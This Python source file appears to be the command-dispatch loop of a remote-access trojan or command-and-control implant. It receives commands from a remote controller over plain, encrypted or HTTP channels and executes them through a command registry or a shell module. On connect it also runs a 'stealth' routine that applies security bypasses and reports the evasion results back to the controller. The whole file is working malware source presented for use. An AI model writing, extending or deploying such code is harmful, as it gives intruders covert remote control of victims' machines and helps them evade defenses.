"""Client command dispatch loop."""
import socket
import time

from client.commands import build_client_registry
from client.modules.shell import run_command
from client.modules.stealth import apply_all_bypasses


def handle_session(sock_or_protocol, platform, encryption=False, tls=False,
                   auto_bypass=True, http_mode=False, idle_timeout=300):
    if http_mode:
        protocol = sock_or_protocol
    else:
        from client.core.protocol import Protocol
        protocol = Protocol(sock_or_protocol) if not encryption else _build_encrypted(sock_or_protocol)
        sock_or_protocol.settimeout(idle_timeout)

    from client.core.session_context import SessionContext
    ctx = SessionContext(sock=sock_or_protocol if not http_mode else None,
                         protocol=protocol, platform=platform)
    registry = build_client_registry()

    if auto_bypass and not http_mode:
        try:
            evasion_info = apply_all_bypasses()
            protocol.send(f'[evasion]\n{evasion_info}')
        except Exception:
            pass

    try:
        while True:
            try:
                command = protocol.recv()
            except socket.timeout:
                continue
            if command is None:
                continue
            if isinstance(command, dict):
                command = command.get('command', '')
            elif isinstance(command, (list, int, float)):
                command = ''
            else:
                command = str(command).strip()
            if not command:
                continue
            result = registry.dispatch(ctx, command)
            if result is False:
                break
            if result is None:
                run_command(protocol, command, ctx.proc_holder)
    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        ctx.cleanup()
        if not http_mode and sock_or_protocol:
            try:
                sock_or_protocol.close()
            except Exception:
                pass


def _build_encrypted(sock):
    from client.core.encrypted_protocol import EncryptedProtocol
    proto = EncryptedProtocol(sock)
    proto.perform_key_exchange(initiator=True)
    return proto
